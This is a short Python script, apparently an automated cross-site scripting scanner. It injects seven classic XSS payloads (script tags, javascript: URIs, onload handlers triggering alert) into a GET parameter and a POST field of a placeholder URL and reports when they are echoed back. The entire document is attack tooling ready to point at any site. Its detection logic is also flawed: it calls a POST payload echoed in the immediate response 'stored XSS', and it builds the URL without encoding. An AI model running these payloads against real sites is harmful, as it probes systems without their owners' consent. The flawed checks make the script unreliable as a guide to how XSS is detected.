import requests
import re

# Define target URL
url = "http://example.com"

# Define payloads
payloads = ["<script>alert('XSS')</script>",
            "'\"><script>alert('XSS')</script>",
            "<img src=\"javascript:alert('XSS');\">",
            "<iframe src=\"javascript:alert('XSS');\"></iframe>",
            "<svg onload=\"alert('XSS')\">",
            "<body onload=\"alert('XSS')\">",
            "<a href=\"javascript:alert('XSS');\">Click Me</a>"]

# Loop through payloads and inject them into each parameter
for payload in payloads:
    # Send GET request
    response = requests.get(url + "?parameter=" + payload)
    # Check for reflected XSS
    if re.search(re.escape(payload), response.text):
        print("Reflected XSS found with payload: " + payload)
    # Send POST request
    response = requests.post(url, data={"parameter": payload})
    # Check for stored XSS
    if re.search(re.escape(payload), response.text):
        print("Stored XSS found with payload: " + payload)
